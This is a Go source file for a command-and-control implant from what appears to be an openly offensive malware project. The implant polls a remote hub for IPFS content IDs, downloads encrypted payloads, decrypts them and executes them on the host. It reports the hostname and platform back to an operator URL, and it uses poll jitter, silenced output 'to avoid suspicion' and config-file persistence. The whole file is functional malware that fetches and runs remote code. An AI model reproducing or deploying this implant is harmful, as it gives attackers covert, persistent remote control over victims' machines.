// Command client is the implant for the C2 IPFS payload delivery system.
//
// It polls a CID source (HTTP hub or smart contract), fetches payloads
// from IPFS when a new CID is detected, decrypts, and executes them.
//
// Usage:
//   Mode A (HTTP): ./client --cid-source http://hub.example.com:8443 --decryption-key <hex>
//   Mode B (cont.): ./client --cid-source <contract-addr> --rpc-url <rpc> --decryption-key <hex>
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/churchofmalware/c2-ipfs-payload/pkg/crypto"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/ipfs"
	"github.com/churchofmalware/c2-ipfs-payload/pkg/types"
)

type Implant struct {
	mu             sync.RWMutex
	config         types.Config
	lastCID        string
	lastFetchTime  time.Time
	httpClient     *http.Client
	pollTicker     *time.Ticker
	stopCh         chan struct{}
	fetchCount     int
	execCount      int
	startTime      time.Time
}

func NewImplant(cfg types.Config) *Implant {
	if cfg.ImplantID == "" {
		// Generate a random implant ID
		idBytes := make([]byte, 8)
		rand.Read(idBytes)
		cfg.ImplantID = hex.EncodeToString(idBytes)
	}
	if len(cfg.Gateways) == 0 {
		cfg.Gateways = ipfs.DefaultGateways
	}
	if cfg.PollInterval <= 0 {
		cfg.PollInterval = 60 // default 60 seconds
	}
	if cfg.Mode == "" {
		cfg.Mode = "http"
	}

	return &Implant{
		config:    cfg,
		lastCID:   cfg.LastCID,
		httpClient: &http.Client{Timeout: 30 * time.Second},
		stopCh:    make(chan struct{}),
		startTime: time.Now(),
	}
}

// poll fetches the current CID from the configured source.
func (im *Implant) poll() (string, error) {
	switch im.config.Mode {
	case "http":
		return im.pollHTTP()
	case "contract":
		return im.pollContract()
	default:
		return "", fmt.Errorf("unknown mode: %s", im.config.Mode)
	}
}

// pollHTTP fetches the current CID from the HTTP CID hub.
func (im *Implant) pollHTTP() (string, error) {
	url := strings.TrimRight(im.config.CIDSource, "/") + "/cid"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %w", err)
	}

	if im.config.JWTFetch != "" {
		req.Header.Set("Authorization", "Bearer "+im.config.JWTFetch)
	}

	resp, err := im.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return "", nil // No CID set yet
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return "", fmt.Errorf("failed to read response: %w", err)
	}

	var result struct {
		CID string `json:"cid"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("failed to parse response: %w", err)
	}

	return result.CID, nil
}

// pollContract watches smart contract events.
// This is a placeholder — real implementation requires go-ethereum.
func (im *Implant) pollContract() (string, error) {
	// TODO: Implement contract event watching when built with -tags ethereum
	return "", fmt.Errorf("contract mode requires 'go build -tags ethereum ./cmd/client'")
}

// processCID handles a new CID: fetch, verify, decrypt, execute.
func (im *Implant) processCID(cid string) error {
	log.Printf("New CID detected: %s", cid)

	// 1. Fetch from IPFS
	log.Printf("Fetching payload from IPFS (CID: %s)...", cid)
	data, err := ipfs.Download(cid, im.config.Gateways)
	if err != nil {
		return fmt.Errorf("IPFS download failed: %w", err)
	}
	log.Printf("Downloaded %d bytes from IPFS", len(data))

	// 2. Verify content addressing
	if err := ipfs.VerifyCID(data, cid); err != nil {
		return fmt.Errorf("CID verification failed: %w", err)
	}

	// 3. Decrypt
	key := crypto.DeriveKey(im.config.DecryptionKey)
	// Try hex key first; fall back to derived key
	var plaintext []byte
	var decErr error

	if len(im.config.DecryptionKey) == 64 {
		if keyBytes, hErr := hex.DecodeString(im.config.DecryptionKey); hErr == nil && len(keyBytes) == 32 {
			plaintext, decErr = crypto.Decrypt(data, keyBytes)
		}
	}
	if plaintext == nil {
		plaintext, decErr = crypto.Decrypt(data, key)
	}
	if decErr != nil {
		return fmt.Errorf("decryption failed: %w", decErr)
	}
	log.Printf("Decrypted payload (%d bytes), executing...", len(plaintext))

	// 4. Save to temp file
	tmpFile, err := ipfs.SaveTempFile(plaintext, "c2payload-*")
	if err != nil {
		return fmt.Errorf("failed to save temp file: %w", err)
	}
	defer os.Remove(tmpFile)

	// 5. Execute
	cmd := exec.Command(tmpFile)
	cmd.Stdout = nil  // Don't capture output by default to avoid suspicion
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("execution failed: %w", err)
	}

	log.Printf("Payload executed (PID: %d)", cmd.Process.Pid)
	im.mu.Lock()
	im.execCount++
	im.lastCID = cid
	im.lastFetchTime = time.Now()
	im.mu.Unlock()

	// 6. Report back (fire and forget)
	go im.report(cid, true, "")

	return nil
}

// report sends execution status back to the operator.
func (im *Implant) report(cid string, success bool, errMsg string) {
	if im.config.ReportURL == "" {
		return
	}

	hostname, _ := os.Hostname()
	report := types.ImplantReport{
		ImplantID: im.config.ImplantID,
		CID:       cid,
		Success:   success,
		Error:     errMsg,
		Platform:  runtime.GOOS + "/" + runtime.GOARCH,
		Hostname:  hostname,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	data, _ := json.Marshal(report)
	im.httpClient.Post(im.config.ReportURL, "application/json",
		strings.NewReader(string(data)))
}

// run starts the main polling loop with jitter.
func (im *Implant) run() {
	log.Printf("Implant started (ID: %s, mode: %s)", im.config.ImplantID, im.config.Mode)
	log.Printf("Poll interval: %ds with jitter", im.config.PollInterval)
	log.Printf("CID source: %s", im.config.CIDSource)
	if im.config.ReportURL != "" {
		log.Printf("Report URL: %s", im.config.ReportURL)
	}

	// Initial poll
	im.pollLoop()

	// Start ticker with jitter
	baseInterval := time.Duration(im.config.PollInterval) * time.Second
	im.pollTicker = time.NewTicker(baseInterval)

	for {
		select {
		case <-im.pollTicker.C:
			im.pollLoop()
		case <-im.stopCh:
			log.Println("Implant shutting down...")
			return
		}
	}
}

// pollLoop performs one poll cycle with jitter.
func (im *Implant) pollLoop() {
	// Add jitter: ±20% of polling interval
	jitterRange := int64(float64(im.config.PollInterval) * 0.2)
	if jitterRange < 1 {
		jitterRange = 1
	}
	jitterMs, _ := rand.Int(rand.Reader, big.NewInt(jitterRange*1000))
	time.Sleep(time.Duration(jitterMs.Int64()) * time.Millisecond)

	cid, err := im.poll()
	if err != nil {
		log.Printf("Poll error: %v", err)
		return
	}
	if cid == "" {
		return // No CID available yet
	}

	im.mu.RLock()
	lastCID := im.lastCID
	im.mu.RUnlock()

	if cid == lastCID {
		return // Same CID, nothing to do
	}

	if err := im.processCID(cid); err != nil {
		log.Printf("CID processing error: %v", err)
		im.report(cid, false, err.Error())
	}
}

// saveConfig persists the current state to a config file.
func (im *Implant) saveConfig(path string) error {
	im.mu.RLock()
	cfg := im.config
	cfg.LastCID = im.lastCID
	im.mu.RUnlock()

	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0600)
}

// loadConfig loads implant state from a config file.
func loadConfig(path string) (*types.Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg types.Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func main() {
	var (
		cidSource     = flag.String("cid-source", "", "CID source URL (mode A) or contract address (mode B)")
		decryptionKey = flag.String("decryption-key", "", "Payload decryption key (32-byte hex or passphrase)")
		pollInterval  = flag.Int("poll-interval", 60, "Poll interval in seconds")
		mode          = flag.String("mode", "http", "Operation mode: 'http' or 'contract'")
		rpcURL        = flag.String("rpc-url", "", "Ethereum RPC URL (mode B)")
		gateways      = flag.String("gateways", "", "Comma-separated IPFS gateway URLs")
		reportURL     = flag.String("report-url", "", "URL to POST execution reports")
		configFile    = flag.String("config", "", "Path to config file (for persistence)")
		jwtFetch      = flag.String("jwt-fetch", "", "JWT for authenticated CID hub access")
		implantID     = flag.String("id", "", "Implant ID (auto-generated if empty)")
	)
	flag.Parse()

	if *cidSource == "" {
		log.Fatal("--cid-source is required (URL for mode A, contract addr for mode B)")
	}
	if *decryptionKey == "" {
		log.Fatal("--decryption-key is required")
	}

	// Parse gateways
	var gwList []string
	if *gateways != "" {
		gwList = strings.Split(*gateways, ",")
	}

	_ = rpcURL // used in mode B (contract)

	// Build config
	cfg := types.Config{
		ImplantID:     *implantID,
		DecryptionKey: *decryptionKey,
		PollInterval:  *pollInterval,
		CIDSource:     *cidSource,
		Mode:          *mode,
		Gateways:      gwList,
		ReportURL:     *reportURL,
		JWTFetch:      *jwtFetch,
	}

	// Try loading from config file for persistence
	if *configFile != "" {
		savedCfg, err := loadConfig(*configFile)
		if err == nil {
			// Merge: CLI flags override config file
			if *implantID == "" && savedCfg.ImplantID != "" {
				cfg.ImplantID = savedCfg.ImplantID
			}
			if *decryptionKey == "" && savedCfg.DecryptionKey != "" {
				cfg.DecryptionKey = savedCfg.DecryptionKey
			}
			if *cidSource == "" && savedCfg.CIDSource != "" {
				cfg.CIDSource = savedCfg.CIDSource
			}
			if savedCfg.LastCID != "" {
				cfg.LastCID = savedCfg.LastCID
			}
			if len(gwList) == 0 && len(savedCfg.Gateways) > 0 {
				cfg.Gateways = savedCfg.Gateways
			}
		}
	}

	implant := NewImplant(cfg)

	// Periodically save config for persistence
	if *configFile != "" {
		go func() {
			ticker := time.NewTicker(5 * time.Minute)
			defer ticker.Stop()
			for range ticker.C {
				if err := implant.saveConfig(*configFile); err != nil {
					log.Printf("Failed to save config: %v", err)
				}
			}
		}()
	}

	// Handle signals
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		log.Println("Received shutdown signal")
		if *configFile != "" {
			implant.saveConfig(*configFile)
		}
		os.Exit(0)
	}()

	implant.run()
}
